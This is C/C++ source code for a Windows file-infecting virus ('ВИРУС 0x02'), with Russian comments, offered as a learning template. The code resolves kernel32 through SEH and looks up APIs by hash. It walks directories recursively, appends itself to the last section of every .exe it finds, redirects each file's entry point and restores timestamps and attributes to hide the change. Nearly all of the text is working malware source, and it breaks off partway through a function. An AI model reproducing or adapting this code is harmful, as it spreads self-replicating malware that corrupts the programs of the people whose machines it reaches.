/**********************************************************************************************
*																							  *
*																							  *
*                                                                                             *  
*              ############                          ############         ############        *                                    
*             ##############                        ##############       ##############       *                            
*            ##            ##                      ##            ##     ##            ##      *            
*            ##            ##                      ##            ##     ##            ##      *         
*            ##            ##                      ##            ##     ##            ##      *          
*            ##            ##                      ##            ##     ##          ###       *         
*            ##            ##     ##        ##     ##            ##               ###         *                 
*            ##            ##      ##      ##      ##            ##             ###           *           
*            ##            ##       ##    ##       ##            ##           ###             *               
*            ##            ##        ##  ##        ##            ##         ###               *          
*            ##            ##         ####         ##            ##       ###                 *       
*            ##            ##         ####         ##            ##      ##                   *      
*            ##            ##        ##  ##        ##            ##      ##                   *      
*            ##            ##       ##    ##       ##            ##      ##                   *
*			  ##############       ##      ##       ##############       ###############      *                                          
*              ############       ##        ##       ############        ###############      *                                      
*                                                                                             *  
*                                                                                             *   
*																							  *
***********************************************************************************************
*																							  *
*									### #####                                                 *
*									### ######                                                *   
*										##   ##                                               *  
*										##   ##												  *
*									###	######                                                *
*									### #####                                                 *   
*																							  * 
***********************************************************************************************                                                                              
*																							  *
*									ВИРУС 0x02												  *
*																							  *
*									   ТЕМЫ:												  *
*																							  *
*(+) Поиск адреса Kernel32 через SEH														  *
*(+) Инфекция РЕ-файлов (*.exe)																  *
*(+) Не изменяется время последней модификации файлов										  *
*(+) Не изменяются атрибуты файлов															  *
*(+) Двухпотоковый
*(+) Полезная нагрузка (вызов мессаги в определенное время:)								  *						  
*																							  *
*(-) Перебивается точка входа																  *
*(-) Изменяется размер файла																  *
*(-) Не оптимизирован (т.к. хотелось почти все написать только на С/С++)					  *
*																							  *
*(Х) Прошел проверку на ОС Windows XP SP2, на других не тестил.								  *
*																							  *
*									Версия 2.0												  *
*																							  *
***********************************************************************************************
*																							  *
*																							  *
*																							  *
***********************************************************************************************
*																							  *
*									ДОПОЛНЕНИЕ:												  *
*																							  *
*1) Инфект файлов происходит в заданной папке + во вложенных тоже.							  *
*2) Данный вирус инфектит файлы методом расширения последней секции.						  *
*3) Вирус создан в целях саморазвития и образования.										  *
*4) Свободно может использоваться как шаблон для написания базонезависимого кода.			  *
*5) Написан как пример создания на языке высокого уровня (С/С++).							  *
*6) 1 поток - инфект файлов, 2 поток - полезная нагрузка									  *
*																							  *
***********************************************************************************************
*																							  *
*										...													  *
*																							  *
* Чтобы писать более-менее нормальный вирус на ЯВУ (конкретно на С), код делаем				  *
* базонезависимым (ясен хрен). Достигается это следующим образом:							  *
*	(+) никакого startup-кода и rtl (run-time library). Для этого не используем				  *
*			никаких стандартных библиотек и указываем в качестве главной функции свою		  *
*			(пример избавления от startup: #pragma comment(linker,"/ENTRY:Start") + смотри,	  *
*			как выгладит функция Start());													  *
*	(+) никакой таблицы импорта, то есть все адреса функций ищем сами (как варик, через		  *
*			таблицу экспорта нужной библиотеки, etc);										  *
*	(+) никаких глобальных переменных, но если они есть, тогда перемещаем их в кодовую		  *
*			секцию и ставим ей атрибуты RWE. И работать с такими переменными надо через		  *
*			дельта-смещение. Локальные же переменные - находятся в стэке, поэтому с ними	  *
*			никакой возни.																	  *
*	(+) строки (char*) - либо могут находится в стэке, либо быть глобальными массивами. В	  *
*			первом случае оформлять так (пример): char szStr[]={'V','X',0};					  *
*			Во втором же случае понадобится дельта-смещение. А оформляются просто:			  *
*			char szStr[]="VX";																  *	
*	(+) не переборщить с общим размером локальныхъ переменных.								  *
*																							  *
* Остальные фичи и хери смотрим в исходнике. Отмечу, что на ЯВУ пишется легче и смотрится	  *
* наглядней. Но, как ни трахай, без асма никуда:)											  *
*																							  *
**********************************************************************************************/
//VC++ 6 (Compiler cl.exe)


																					//m1x
																			   //pr0mix@mail.ru


#include <windows.h>


//теперь стартовая функция Start()
#pragma comment(linker,"/ENTRY:Start")

//делаем так, чтобы у нас была только одна секция - кодовая(.text)
#pragma comment(linker,"/MERGE:.rdata=.data /MERGE:.data=.text")

//ставим ей атрибуты: чтение/запись/выполнение
#pragma comment(linker,"/SECTION:.text,RWE")

//перевод RVA в VA
#define RVATOVA(Base,Rva) ((DWORD)Base + (DWORD)Rva)

//выравнивание
#define ALIGN_UP(x,y) ((x+(y-1))&(~(y-1)))

//размер нашего зверька
#define VirusSize ((DWORD)fnEnd - (DWORD)Start)


//далее идут прототипы необходимых функций
fnEnd();
int fnstrlen(char *pStr);
char* fnstrcpy(char *pStr1,char *pStr2);
char *fnstrcat(char *pStr1,char *pStr2);
int fnstrcmp(char *pStr1,char *pStr2);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg(A a);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg2(A a);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg3(A a);

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg2(A a);

template<DWORD Base,DWORD dwHash,class A,class B>
inline LPVOID pusharg(A a,B b);

template<DWORD Base,DWORD dwHash,class A,class B,class C>
inline LPVOID pusharg(A a,B b,C c);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D>
inline LPVOID pusharg(A a,B b,C c,D d);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E>
inline LPVOID pusharg(A a,B b,C c,D d,E e);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g);

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G,class H>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g,H h);

int IsInfect(unsigned char* pExe);
void FindExe(char *szDir,char *szMask);
int ValidPE(unsigned char *pExe);
int InfectFiles(char *szPath,WIN32_FIND_DATA* wfd);
DWORD GetKernelSEH();
DWORD CalcHash(char *pNameFunc);
LPVOID GetGetProcAddress(DWORD Base,DWORD dwHashName);
DWORD WINAPI ThreadFunc1(PVOID pv);//WINAPI==__stdcall
DWORD WINAPI ThreadFunc2(PVOID pv);
DeltaOffset();


// для удобства:)
#define	_fCreateFileA					pusharg<1,0x860b38bc>
#define	_fCreateFileMappingA			pusharg<1,0x1F394C74>
#define	_fMapViewOfFile					pusharg<1,0xFC6FB9EA>
#define	_fUnmapViewOfFile				pusharg2<1,0xCA036058>
#define	_fCloseHandle					pusharg3<1,0xF867A91E>
#define	_fFindFirstFileA				pusharg<1,0x3165E506>
#define	_fFindNextFileA					pusharg<1,0xCA920AD8>
#define	_fSetFileAttributesA			pusharg<1,0x152DC5D4>
#define	_fGetCurrentDirectoryA			pusharg<1,0x2F597DD6>
#define	_fLoadLibraryA					pusharg<1,0x71E40722>
#define	_fGetProcAddress				pusharg<1,0x5D7574B6>
#define	_fSetFileTime					pusharg<1,0xa2d2cb0c>
#define	_fVirtualProtect				pusharg<1,0x15f8ef80>
#define	_fExitProcess					pusharg<1,0xD66358EC>
#define _fGetFullPathNameA				pusharg<1,0x5dbc5670>
#define _fSetFilePointer				pusharg<1,0x7f3545c6>
#define _fSetEndOfFile					pusharg<1,0x059c5e24>
#define _fGetSystemTime					pusharg<1,0x8C8E727E>
#define _fCreateThread					pusharg<1,0x15B87EA2>
#define _fWaitForMultipleObjects		pusharg<1,0x0DD40E20>

#define _fMessageBoxA					pusharg<2,0xBE7B3098>


//глобальный массив
char szStr[MAX_PATH];


/**********************************************************************************************
*																							  *
*	Функция Start																			  *
*	Наша главная функция:)																	  *
*	Начало выполнения кода																	  *
*	Эта функция должна быть определена первой (как в данном случае). Если же перед ней		  *
*	определеить другие функции, тогда в таком случае надо скорректировать и EntryPoint жертвы *
*	так, чтобы начало выплнения кода началось именно со Start (короче смотри исходник, в	  *
*	отладчик, дизасм:)!																		  *
*																							  *
**********************************************************************************************/
void Start()
{

	DWORD ThID;
	HANDLE mThread[2];
	DWORD Delta=DeltaOffset();
	typedef DWORD (WINAPI *func)(PVOID);
	func pThread1=(func)((DWORD)ThreadFunc1+Delta);
	func pThread2=(func)((DWORD)ThreadFunc2+Delta);
	mThread[0]=_fCreateThread(0,0,pThread1,0,0,&ThID);
	mThread[1]=_fCreateThread(0,0,pThread2,0,0,&ThID);
	_fWaitForMultipleObjects(2,mThread,1,INFINITE);

	//в первом поколении эта функция просто вернет управление назад в Start, а при 
	//последующих - передает управление на OEP жертвы.
	fnEnd();	
}
/**********************************************************************************************
*																							  *
*	Конец функции Start																		  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция ThreadFunc1																		  *
*	Инфект файлов																			  *
*	Вход:																					  *
*	pv - что угодно																			  *
*	Выход:																					  *
*	всегда 0																				  *
*																							  *
**********************************************************************************************/
DWORD WINAPI ThreadFunc1(PVOID pv)
{
	char szPath[MAX_PATH];
	char szMask[]={'\\','*','.','*',0};
	_fGetCurrentDirectoryA(MAX_PATH,szPath);	
	FindExe(szPath,szMask);
	return 0;
}
/**********************************************************************************************
*																							  *
*	Конец функции ThreadFunc1																  *
*																							  *
**********************************************************************************************/






/**********************************************************************************************
*																							  *
*	Функция ThreadFunc2																		  *
*	Полезная нагрузка																		  *
*	Вход:																					  *
*	pv - что угодно																			  *
*	Выход:																					  *
*	всегда 0																				  *
*																							  *
**********************************************************************************************/
DWORD WINAPI ThreadFunc2(PVOID pv)
{
	SYSTEMTIME st;
	char szMsg[]={'0','x','0','2',' ','b','y',' ','m','1','x',0};

	//пример того, как работать с глобальными переменными
	char *pStr=(char*)((DWORD)szStr+DeltaOffset());
	pStr[0]='V';
	pStr[1]='X';
	pStr[2]='!';
	pStr[3]='\0';	
	
	_fGetSystemTime(&st);
	if(st.wMinute%2)
	_fMessageBoxA(0,szMsg,pStr,0);
	return 0;
}
/**********************************************************************************************
*																							  *
*	Конец функции ThreadFunc2																  *
*																							  *
**********************************************************************************************/



/**********************************************************************************************
*																							  *
*	Функция DeltaOffset																		  *
*	Вычисление дельта-смещения																  *
*	Выход:																					  *
*	Возвращает дельта-смещение (еах)														  *
*																							  *
**********************************************************************************************/
DeltaOffset()
{
	__asm
	{
		call	_delta_
_delta_:
		pop		eax
		sub		eax,offset _delta_
	}
}
/**********************************************************************************************
*																							  *
*	Конец функции DeltaOffset																  *
*																							  *
**********************************************************************************************/




/**********************************************************************************************
*																							  *
*	Функция fnstrlen																		  *
*	подсчет символов в строке																  *
*	Вход:																					  *
*	pStr - указатель на строку																  *
*	Выход:																					  *
*	функция возвращает количество символов в строке											  *
*																							  *
**********************************************************************************************/
int fnstrlen(char *pStr)
{
	int len=0;
	while(*pStr++)
		len++;
	return len;
}
/**********************************************************************************************
*																							  *
*	Конец функции fnstrlen																	  *
*																							  *
**********************************************************************************************/




/**********************************************************************************************
*																							  *
*	Функция fnstrcpy																		  *
*	Копирование одной строки в другую														  *
*	Вход:																					  *
*	pStr1 - указатель на строку приемник													  *
*	pStr2 - указатель на строку источник													  *
*	Выход:																					  *
*	pStr1 - искомая строка																	  *
*	функция возвращает на указатель на строку приемник										  *
*																							  *
**********************************************************************************************/
char* fnstrcpy(char *pStr1,char *pStr2)
{
	char *pTmp=pStr1;
	while(*pStr1++=*pStr2++)		
	*pStr1='\0';
	return pTmp;
}
/**********************************************************************************************
*																							  *
*	Конец функции fnstrcpy
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция fnstrcat																		  *
*	Конкатенация строк																		  *
*	Вход:																					  *
*	pStr1 - указатель на строку приемник													  *
*	pStr2 - указатель на строку источник													  *
*	Выход:																					  *
*	pStr1 - искомая строка																	  *
*	функция возвращает на указатель на строку приемник										  *
*																							  *
**********************************************************************************************/
char *fnstrcat(char *pStr1,char *pStr2)
{
	char *pTmp=pStr1;
	while(*pStr1++);
//	pStr1--;
	fnstrcpy(--pStr1,pStr2);
	return pTmp;
}
/**********************************************************************************************
*																							  *
*	Конец функции fnstrcat																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция fnstrcmp																		  *
*	Сравнение строк																			  *
*	Вход:																					  *
*	pStr1 - указатель на строку приемник													  *
*	pStr2 - указатель на строку источник												      *
*	Выход:																					  *
*	pStr1 - искомая строка																	  *
*	функция возвращает на указатель на строку приемник										  *
*																							  *
**********************************************************************************************/
int fnstrcmp(char *pStr1,char *pStr2)
{
//	int len1=fnstrlen(pStr1);
	int len2=fnstrlen(pStr2);
	while(*pStr1)
	{
		if(*pStr1++==*pStr2++)
		len2--;
	}
	return len2;
}
/**********************************************************************************************
*																							  *
*	Конец функции fnstrcmp																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Перегруженные функции pusharg
*	Функции поиска адреса и вызова нужной апишки											  *
*	Вход:																					  *
*	Base - номер базы(1 - Kernel32, 2 - User32, default - return 0)							  *
*	dwHash - хеш от имени функции															  *
*	class x - параметры будущей найденной функции											  *
*																							  *
**********************************************************************************************/
template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg(A a)
{
	typedef LPVOID(__stdcall* func)(A);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a);
}

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg2(A a)
{
	typedef LPVOID(__stdcall* func)(A);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a);
}

template<DWORD Base,DWORD dwHash,class A>
inline LPVOID pusharg3(A a)
{
	typedef LPVOID(__stdcall* func)(A);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a);
}

template<DWORD Base,DWORD dwHash,class A,class B>
inline LPVOID pusharg(A a,B b)
{
	typedef LPVOID(__stdcall* func)(A,B);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C>
inline LPVOID pusharg(A a,B b,C c)
{
	typedef LPVOID(__stdcall* func)(A,B,C);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D>
inline LPVOID pusharg(A a,B b,C c,D d)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E>
inline LPVOID pusharg(A a,B b,C c,D d,E e)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E,F);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e,f);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E,F,G);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e,f,g);
}

template<DWORD Base,DWORD dwHash,class A,class B,class C,class D,class E,class F,class G,class H>
inline LPVOID pusharg(A a,B b,C c,D d,E e,F f,G g,H h)
{
	typedef LPVOID(__stdcall* func)(A,B,C,D,E,F,G,H);
	func fnFunc=(func)GetGetProcAddress(Base,dwHash);
	return fnFunc(a,b,c,d,e,f,g,h);
}
/**********************************************************************************************
*																							  *
*	Конец функций pusharg																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция InfectFiles																		  *
*	Инфект PE-файлов методом расширения последней секции									  *
*	Вход:																					  *
*	szPath - путь к файлу - жертве:)!														  *
*	wfd - указатель на структуру															  *
*	Выход:																					  *
*	функция возвращает 1, если все супер, иначе 0.											  *
*																							  *
**********************************************************************************************/
int InfectFiles(char *szPath,WIN32_FIND_DATA* wfd)
{
	//объявление вспомогательных переменных
	//здесь будут храниться:
	DWORD VirtualSize;								//виртуальный размер последней секции
	DWORD Overlay;									//размер оверлея (если есть)
	DWORD WriteTo,WriteFrom;						//адреса, куда/откуда записывать
	DWORD NewEP;									//новая точка входа жертвы
	DWORD OEP;										//original entry point
	LPVOID pExe;									//база мэппинга
	IMAGE_DOS_HEADER *imDh;							//мз-заголовок
	IMAGE_NT_HEADERS *imNTh;						//нт-заголовок
	IMAGE_SECTION_HEADER *imSh;						//секционный заголовок
	IMAGE_SECTION_HEADER *pLastSection;				//указатель на последнюю секцию
	HANDLE hFileMap;								//хэндл открутого файла
	DWORD NewSize;									//новый вычисленный размер
	DWORD i;										//счетчик
	unsigned char RetCode[]=						//с помощью этих опкодов строим переход на жертву (mov eax,OEP	jmp eax)
	{
		0xb8,0xff,0xe0
	};

	//ставим нужные атрибуты (на случай, если стоит ReadOnly)
	_fSetFileAttributesA(szPath,FILE_ATTRIBUTE_NORMAL);
	
/**********************************************************************************************
								BEG   Получение базы мэппинга
**********************************************************************************************/

	//открываем файл на чтение/запись
	HANDLE hFile=(HANDLE)_fCreateFileA(szPath,GENERIC_READ | GENERIC_WRITE,
							FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,
							OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	//если неудачно, переходим
	if(hFile==INVALID_HANDLE_VALUE) goto _error2_;

	//новый размер с учетом выравнивания. Делаем FileAlignment=0x1000 (т.е. с запасом)
	NewSize=ALIGN_UP(VirusSize+7,0x1000);
	NewSize+=wfd->nFileSizeLow;

	//Создаем проекцию файла с учетом нового размера
	hFileMap=(HANDLE)_fCreateFileMappingA(hFile,0,PAGE_READWRITE,0,NewSize,0);
	if(!hFileMap)
	{
		_fCloseHandle(hFile);
		goto _error2_;
	}

	//получаем базу мэппинга
	pExe=(LPVOID)_fMapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
	_fCloseHandle(hFile);
	_fCloseHandle(hFileMap);
	if(!pExe)
	{
		goto _error1_;
	}
/**********************************************************************************************
								END   Получение базы мэппинга
**********************************************************************************************/

	//это РЕ-файл?
	if(!ValidPE((unsigned char *)pExe))
		goto _error1_;

	//Заражен нами?
	if(IsInfect((unsigned char *)pExe))
		goto _error1_;

/**********************************************************************************************
								BEG Разбор заголовков
**********************************************************************************************/
	imDh=(IMAGE_DOS_HEADER*)pExe;
	imNTh=(IMAGE_NT_HEADERS*)((DWORD)pExe+imDh->e_lfanew);
	imSh=(IMAGE_SECTION_HEADER*)((DWORD)imNTh+sizeof(IMAGE_NT_HEADERS));
	pLastSection=imSh;

	//ищем последнюю секцию виртуально и физически
	for(i=0;i<imNTh->FileHeader.NumberOfSections;i++)
	{
		if((pLastSection->PointerToRawData<imSh->PointerToRawData) &&
		   (pLastSection->VirtualAddress<imSh->VirtualAddress))
			pLastSection=imSh;
		imSh++;
	}
/**********************************************************************************************
								END Разбор заголовков
**********************************************************************************************/	

	//физический размер последней секции==0?
	if(!pLastSection->SizeOfRawData) goto _error1_;

	//эта секция содержит инициализированные данные?
	if(pLastSection->SizeOfRawData<pLastSection->Misc.VirtualSize) goto _error1_;

	//находим уже ТОЧНЫЙ новый размер файла
	NewSize=ALIGN_UP(VirusSize+7,imNTh->OptionalHeader.FileAlignment);
	NewSize+=wfd->nFileSizeLow;
	Overlay=ALIGN_UP(pLastSection->SizeOfRawData+pLastSection->PointerToRawData,
		imNTh->OptionalHeader.FileAlignment);

	//есть ли оверлей?
	if(Overlay<wfd->nFileSizeLow)
	{
		Overlay=wfd->nFileSizeLow-Overlay;
		WriteTo=(DWORD)pExe+NewSize-1;
		WriteFrom=(DWORD)pExe+wfd->nFileSizeLow-1;

		//записываем с конца
		for(unsigned int i=0;i<Overlay;i++)
		{
			*(BYTE*)(WriteTo-i)=*(BYTE*)(WriteFrom-i);
		}
	}

/**********************************************************************************************
								BEG ВНЕДРЕНИЕ КОДА
**********************************************************************************************/
	//находим и сохраняем конец файла на диске
	WriteTo=(DWORD)pExe+pLastSection->PointerToRawData+pLastSection->SizeOfRawData;

	//считаем новую точку входа
	NewEP=pLastSection->VirtualAddress+pLastSection->SizeOfRawData;

	//откуда будем внедрять свой код (с учетом дельты)
	WriteFrom=(DWORD)Start+DeltaOffset();

	//инфектим:)!
	memcpy((PVOID)WriteTo,(PVOID)WriteFrom,VirusSize);

	//корректируем адрес
	WriteTo+=VirusSize;

	//дальше в жертву записываем переход на ее OEP
	memcpy((PVOID)WriteTo,&RetCode[0],1);
	WriteTo++;
	OEP=imNTh->OptionalHeader.ImageBase+imNTh->OptionalHeader.AddressOfEntryPoint;
	memcpy((PVOID)WriteTo,&OEP,4);
	WriteTo+=4;
	memcpy((PVOID)WriteTo,&RetCode[1],2);
/**********************************************************************************************
								END ВНЕДРЕНИЕ КОДА
**********************************************************************************************/

/**********************************************************************************************
								BEG КОРРЕКЦИЯ ПОЛЕЙ ЖЕРТВЫ
**********************************************************************************************/
	
	//корректируем

	//увеличиваем и выравниваем физический размер последней секции
	pLastSection->SizeOfRawData=ALIGN_UP(pLastSection->SizeOfRawData+VirusSize+7,
		imNTh->OptionalHeader.FileAlignment);

	//виртуальный размер
	VirtualSize=pLastSection->Misc.VirtualSize+VirusSize+7;
	if(pLastSection->SizeOfRawData<VirtualSize)
		pLastSection->Misc.VirtualSize=VirtualSize;
	else
		pLastSection->Misc.VirtualSize=pLastSection->SizeOfRawData;

	//точку входа
	imNTh->OptionalHeader.AddressOfEntryPoint=NewEP;

	//размер образа
	imNTh->OptionalHeader.SizeOfImage=ALIGN_UP(pLastSection->Misc.VirtualSize+
		pLastSection->VirtualAddress,imNTh->OptionalHeader.SectionAlignment);

	//характеристики секции
	pLastSection->Characteristics=0xa0000020;

	//ставим метку заражения
	*(WORD*)((DWORD)pExe+0x34)=0x3031;

	//
	wfd->nFileSizeLow=NewSize;

/**********************************************************************************************
								END КОРРЕКЦИЯ ПОЛЕЙ ЖЕРТВЫ
**********************************************************************************************/
	
_error1_:

	//если же произошла фигня, то корректируем правильно новый размер
	NewSize=wfd->nFileSizeLow;

	//закрываем
	_fUnmapViewOfFile(pExe);

_error2_:

/**********************************************************************************************
								BEG ВОССТАНОВЛЕНИЕ
**********************************************************************************************/	
	hFile=(HANDLE)_fCreateFileA(szPath,GENERIC_READ | GENERIC_WRITE,
							FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,
							OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile!=INVALID_HANDLE_VALUE)
	{
	//времени последней модификации
	_fSetFileTime(hFile,&wfd->ftCreationTime,&wfd->ftLastAccessTime,&wfd->ftLastWriteTime);		

	//коррекция размера файла
	_fSetFilePointer(hFile,NewSize,0,FILE_BEGIN);
	_fSetEndOfFile(hFile);	
	}
//	else return 0;
	
	//атрибутов файла
	_fSetFileAttributesA(szPath,wfd->dwFileAttributes);
	return 1;
/**********************************************************************************************
								END ВОССТАНОВЛЕНИЕ
**********************************************************************************************/
}
/**********************************************************************************************
*																							  *
*	Конец функции InfectFiles
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция FindExe																			  *
*	Поиск (и инфект) екзешек в папке + во вложенных папках									  *
*	Вход:																					  *
*	szDir - путь (пример: "C:\\Games\\01")													  *
*	szMasm - маска поиска (пример: "\\*.*")													  *
*																							  *
**********************************************************************************************/
void FindExe(char *szDir,char *szMask)
{
	char szBuf[MAX_PATH];
	int flag=1;
	LPTSTR part;
	WIN32_FIND_DATA wfd;
	
	fnstrcpy(szBuf,szDir);
	fnstrcat(szBuf,szMask);
	_fGetFullPathNameA(szBuf,MAX_PATH,szBuf,&part);

	//начинаем поиск
	HANDLE hFindFile=(HANDLE)_fFindFirstFileA(szBuf,&wfd);
	if(hFindFile!=INVALID_HANDLE_VALUE)
	{
		while(flag)
		{
			//мы нашли папку
			if((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (wfd.cFileName[0]!='.'))
			{
				//переходим в нее
				fnstrcpy(part,wfd.cFileName);//можно вынести, чтобы не повторять:)!
				FindExe(szBuf,szMask);
			}
			else
			{
				//иначе мы нашли файл
				char *pStr=&wfd.cFileName[fnstrlen(wfd.cFileName)-4];
				char szExe[]={'.','e','x','e',0};
				//это екзешка?
				if(fnstrcmp(pStr,szExe)==0)
				{
					//тогда инфектим
					fnstrcpy(part,wfd.cFileName);
					InfectFiles(szBuf,&wfd);
				}
			}
			//ищем дальше
			flag=(int)_fFindNextFileA(hFindFile,&wfd);			
		}
	}
}
/**********************************************************************************************
*																							  *
*	Конец функции FindExe																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция ValidPE																			  *
*	Это РЕ-файл?																			  *
*	Вход:																					  *
*	pExe - база (модуль)																	  *
*	Выход:																					  *
*	функция возвращает 1 - если да, иначе 0													  *
*																							  *
**********************************************************************************************/
int ValidPE(unsigned char *pExe)
{
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)pExe;
	if(imDh->e_magic=='ZM')
	{
		IMAGE_NT_HEADERS *imNTh=(IMAGE_NT_HEADERS*)((int)imDh+imDh->e_lfanew);
		if(imNTh->Signature=='EP')
			return 1;
		else return 0;
	}
	return 0;
}
/**********************************************************************************************
*																							  *
*	Конец функции ValidPE																	  *
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция IsInfect																		  *
*	Проверка на зараженность РЕ-файла														  *
*	Вход:																					  *
*	pExe - база (модуль)																	  *
*	Выход:																					  *
*	функция возвращает 1 - если файл заражен, иначе 0										  *
*																							  *
**********************************************************************************************/
int IsInfect(unsigned char* pExe)
{
	if(*(WORD*)((DWORD)pExe+0x34)==0x3031)
		return 1;
	else return 0;
}
/**********************************************************************************************
*																							  *
*	Конец функции IsInfect																	  *
*																							  *
**********************************************************************************************/






/**********************************************************************************************
*																							  *
*	Функция GetKernelSEH																	  *
*	Поиск базы Kernel32 через SEH															  *
*																							  *
**********************************************************************************************/
DWORD GetKernelSEH()
{
	DWORD *pAddr;
	DWORD i=0;

	//адрес TEB
	__asm
	{
		xor		edx,edx
		mov		eax,dword ptr fs:[edx]
		mov		pAddr,eax
	}

	//поиск конечного обработчика
	while(*pAddr!=-1)
		pAddr=(DWORD*)*pAddr;
	pAddr=(DWORD*)(*(++pAddr));

	//выравниваем с учетом грануляроности выделения памяти
	pAddr=(DWORD*)((DWORD)pAddr & 0xffff0000);
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)pAddr;	

	//количество страниц (5)
	for(;i<5;i++)
	{	

		//поиск базы Кернел32
		if(ValidPE((unsigned char*)imDh))
			break;

		//с учетом гранулярности
		imDh=(IMAGE_DOS_HEADER*)((DWORD)imDh-0x10000);
	}
	return (DWORD)imDh;
}
/**********************************************************************************************
*																							  *
*	Конец функции GetKernelSEH
*																							  *
**********************************************************************************************/





/**********************************************************************************************
*																							  *
*	Функция CalcHash																		  *
*	Подсчет хеша от имени функции															  *
*	Вход:																					  *
*	pNameFunc - адрес строки (имени функции)												  *
*	Выход:																					  *
*	функция возвращает хеш																	  *
*																							  *
**********************************************************************************************/
DWORD CalcHash(char *pNameFunc)
{
	DWORD hash=0,tmp=0;
	while(*pNameFunc)
	{
		tmp=((tmp & 0xFFFFFF00) | *pNameFunc);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		pNameFunc++;
	}
	return hash;
}
/**********************************************************************************************
*																							  *
*	Конец функции CalcHash																	  *
*																							  *
**********************************************************************************************/






/**********************************************************************************************
*																							  *
*	Функция GetGetProcAddress																  *
*	Поиск адреса нужной апи-функции															  *
*	Вход:																					  *
*	Base - номер базы(1 - Kernel32, 2 - User32)												  *
*	dwHashName - хеш от имени функции														  *
*	Выход:																					  *
*	функция возвращает адрес нужной апишки													  *
*																							  *
**********************************************************************************************/
LPVOID GetGetProcAddress(DWORD Base,DWORD dwHashName)
{
	HMODULE hModule;

	//строка в стэке!!!!!!!
	char szUser32[]={'u','s','e','r','3','2',0};
	switch(Base)
	{
	case 1:
		//база Кернела32
		hModule=(HMODULE)GetKernelSEH();
		break;
	case 2:
		//подгружение нужной библиотеки
		hModule=(HMODULE)_fLoadLibraryA(szUser32);
		break;
	default: return 0;
	}

/**********************************************************************************************
								BEG РАЗБОР ТАБЛИЦЫ ЭКСПОРТА В КЕРНЕЛ32
**********************************************************************************************/	
	DWORD i=0;
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)hModule;
	IMAGE_OPTIONAL_HEADER *imOh=(IMAGE_OPTIONAL_HEADER*)((DWORD)hModule+imDh->e_lfanew+4+
		sizeof(IMAGE_FILE_HEADER));
	IMAGE_EXPORT_DIRECTORY *imEd=(IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule,
		imOh->DataDirectory[0].VirtualAddress);
	DWORD *pAddrOfNames=(DWORD*)RVATOVA(hModule,imEd->AddressOfNames);
	WORD  *pAddrOfNameOrdinals=(WORD*)RVATOVA(hModule,imEd->AddressOfNameOrdinals);
	DWORD ordinal=0;
	if (HIWORD((DWORD)dwHashName) == 0)
	{		
		ordinal=(LOWORD((DWORD)dwHashName))-imEd->Base;
	}
	else
	{
		for(;i<imEd->NumberOfNames;i++,pAddrOfNames++,pAddrOfNameOrdinals++)
		{
			//сравниваем по хешам
			if(CalcHash((char*)RVATOVA(hModule,*pAddrOfNames))==dwHashName)
			{
				ordinal=*pAddrOfNameOrdinals;
				break;
			}
		}
	}
	DWORD *pAddrOfFunc=(DWORD*)RVATOVA(hModule,imEd->AddressOfFunctions);
